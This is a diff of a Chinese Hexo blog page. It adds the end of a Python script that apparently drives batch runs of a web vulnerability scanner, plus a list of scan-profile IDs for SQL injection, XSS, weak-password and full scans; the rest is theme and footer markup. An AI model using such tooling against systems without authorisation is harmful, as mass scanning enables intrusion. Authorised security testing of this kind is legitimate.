#t.join()</span><br><span class="line">                    threads.append(t)</span><br><span class="line">                    break</span><br><span class="line">                t.join()</span><br><span class="line">            # for i in thread_max:</span><br><span class="line">            #     t = threads.append(threading.Thread(target=add_exec_scan,args=(url_txt,)))</span><br><span class="line">        count()</span><br><span class="line">        all_time = time.time() - start_time</span><br><span class="line">        print &#x27;共用时&#x27;,all_time</span><br><span class="line">    elif choice == &quot;2&quot;:</span><br><span class="line">        for i in range(del_int):</span><br><span class="line">            del_targets()</span><br><span class="line">        count()</span><br><span class="line">    else:</span><br><span class="line">        print</span><br><span class="line">        &quot;请重新运行并请输入1、2选择。&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>附上扫描模式ID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">11111111-1111-1111-1111-111111111112    高风险漏洞</span><br><span class="line">11111111-1111-1111-1111-111111111115    弱密码扫描</span><br><span class="line">11111111-1111-1111-1111-111111111117    仅爬行</span><br><span class="line">11111111-1111-1111-1111-111111111116    XSS跨站扫描</span><br><span class="line">11111111-1111-1111-1111-111111111113    SQL注入扫描</span><br><span class="line">11111111-1111-1111-1111-111111111111    全扫描</span><br></pre></td></tr></table></figure>
+
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -343,7 +552,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -364,18 +573,12 @@
     <ul>
       <li>
         Copyrights &copy;
-        2017-2021
+        2017-2022
         <i class="ri-heart-fill heart_icon"></i> GuoKer
       </li>
     </ul>
     <ul>
       <li>
-        
-        
-        
-        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
-        <span class="division">|</span>
-        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
         
       </li>
     </ul>
@@ -387,9 +590,12 @@
     <ul>
       
         <li>
-          <a href="http://beian.miit.gov.cn/" target="_black">桂ICP备19000641号-1</a>
+          <a href="http://beian.miit.gov.cn/" target="_black" rel="nofollow">桂ICP备19000641号-1</a>
         </li>
         
+    </ul>
+    <ul>
+      
     </ul>
     <ul>
       <li>
@@ -400,9 +606,10 @@
       </li>
     </ul>
   </div>
-</footer>
-      <div class="float_btns">
-        <div class="totop" id="totop">
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
   <i class="ri-arrow-up-line"></i>
 </div>
 
@@ -410,8 +617,7 @@
   <i class="ri-moon-line"></i>
 </div>
 
-      </div>
-    </main>
+    </div>
     <aside class="sidebar on">
       <button class="navbar-toggle"></button>
 <nav class="navbar">
@@ -471,12 +677,6 @@
 </div>
 </div>
     </aside>
-    <script>
-      if (window.matchMedia("(max-width: 768px)").matches) {
-        document.querySelector('.content').classList.remove('on');
-        document.querySelector('.sidebar').classList.remove('on');
-      }
-    </script>
     <div id="mask"></div>
 
 <!-- #reward -->
@@ -493,22 +693,23 @@
   </div>
 </div>
     
-<script src="/js/jquery-2.0.3.min.js"></script>
-
-
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
 
 <script src="/dist/main.js"></script>
 
 <!-- ImageViewer -->
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
 <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
 
     <!-- Background of PhotoSwipe. 
@@ -613,8 +814,7 @@
         })
     }
     viewer_init()
-</script>
-
+</script> 
 <!-- MathJax -->
 
 <!-- Katex -->
@@ -626,17 +826,13 @@
 <!-- ClickBoom1 -->
 
 <!-- ClickBoom2 -->
-
-
+ 
 <script src="/js/clickBoom2.js"></script>
-
-
+ 
 <!-- CodeCopy -->
-
-
+ 
 <link rel="stylesheet" href="/css/clipboard.css">
-
-<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 <script>
   function wait(callback, seconds) {
     var timelag = null;
@@ -690,12 +886,19 @@
     initCopyCode();
   }(window, document);
 </script>
-
-
+ 
 <!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
 
 
     
+    
+
   </div>
 </body>
 
